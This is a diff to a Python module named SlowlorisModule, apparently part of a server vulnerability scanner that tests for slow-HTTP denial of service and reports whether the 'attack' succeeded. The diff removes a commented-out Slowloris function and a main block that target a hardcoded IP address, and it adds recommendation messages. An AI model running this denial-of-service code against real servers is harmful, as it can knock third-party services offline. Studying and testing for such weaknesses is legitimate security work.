@@ -4,22 +4,6 @@ import random
 import time
 import requests
 
-# def loris():
-#     array_s = list(map(lambda x: socket.socket(socket.AF_INET, socket.SOCK_STREAM),
-#                        list(range(1,250))))
-#
-#     party_packet = "GET / HTTP/1.1\n" + \
-#                    "Connection: Keep-Alive\n"
-#
-#     for s in array_s:
-#         s.connect(("137.74.193.103", 80))
-#         s.send(party_packet)
-#
-#     while 1:
-#         for s in array_s:
-#             s.send("X-a: " + str(random.randint(0, 5000)) + "\n")
-#         time.sleep(8)
-
 
 class SlowlorisModule(object):
     """
@@ -82,8 +66,10 @@ class SlowlorisModule(object):
                              timeout=5.000)
         except:
             self._result["dos_result"] = "Attack was successful!"
+            self._result["recomendation"] = "You should change server or config files to fixed it!"
         if "dos_result" not in self._result.keys():
             self._result["dos_result"] = "Attack failed!"
+            self._result["recomendation"] = "Everything is alright!"
 
     def get_id(self):
         """
@@ -101,7 +87,3 @@ class SlowlorisModule(object):
         """
         return self._result
 
-if __name__ == "__main__":
-    m = SlowlorisModule()
-    m.scan("137.74.193.103", 8080)
-    print(m.get_result())
